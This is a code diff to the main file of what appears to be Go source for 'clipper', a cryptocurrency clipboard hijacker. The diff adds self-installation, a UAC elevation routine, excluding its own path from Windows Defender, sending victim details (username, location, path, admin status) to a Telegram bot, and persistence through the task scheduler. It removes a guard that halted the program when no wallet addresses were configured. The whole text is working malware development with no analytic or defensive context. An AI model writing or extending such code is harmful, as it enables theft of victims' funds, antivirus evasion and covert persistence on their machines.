@@ -8,8 +8,11 @@ import (
 
 	"clipper/src/autorun"
 	"clipper/src/clipper"
+	"clipper/src/defender"
 	"clipper/src/geoblock"
+	"clipper/src/install"
 	"clipper/src/telegram"
+	"clipper/src/uac"
 	"clipper/src/utils"
 )
 
@@ -57,40 +60,36 @@ var matchers = []clipper.Matcher{
 }
 
 func main() {
+	install.InstallSelf()
+
+	uac.Run()
+
 	// we checking geo block
 	geo := utils.GetGeo()
 	geoblock.GeoBlock(blockedGeos, geo)
 
-	// we checking addresses
-	if BtcAddr == "" && EthAddr == "" && LtcAddr == "" && DogeAddr == "" && 
-	   TonAddr == "" && UsdtTrcAddr == "" && SolAddr == "" && XmrAddr == "" && SteamAddr == "" {
-		fmt.Println("No addresses configured. Please rebuild with proper addresses.")
-		return
-	}
-
 	selfPath, _ := utils.GetSelfPath()
 	selfName, _ := utils.GetSelfName()
+
+	_ = defender.ExcludeFromDefender(selfPath)
 
 	user, _ := user.Current()
 	pid := syscall.Getpid()
 
 	// send start log to telegram
 	telegram.SendLog(fmt.Sprintf(
-		"🟢 %s (%s)\n<code>%s</code>\nPID <code>%d</code>",
+		"🟢 %s (%s)\n<code>%s</code>\nPID <code>%d</code>\nUAC <code>%t</code>",
 		user.Username,
 		geo,
 		selfPath,
 		pid,
+		utils.IsAdmin(),
 	), chat_id, bot_token)
 
-	// we adding self to windows autorun
-	_ = autorun.AddToAutorun(selfPath, selfName)
+	_ = autorun.AddToSchelduler(selfPath, selfName)
 
 	// we starting main clipper process
 	clipper.StartClipper(chat_id, bot_token, matchers, user.Username)
-
-	// we starting autorun watcher
-	autorun.StartWatcher(selfPath, selfName)
 
 	select {}
 }
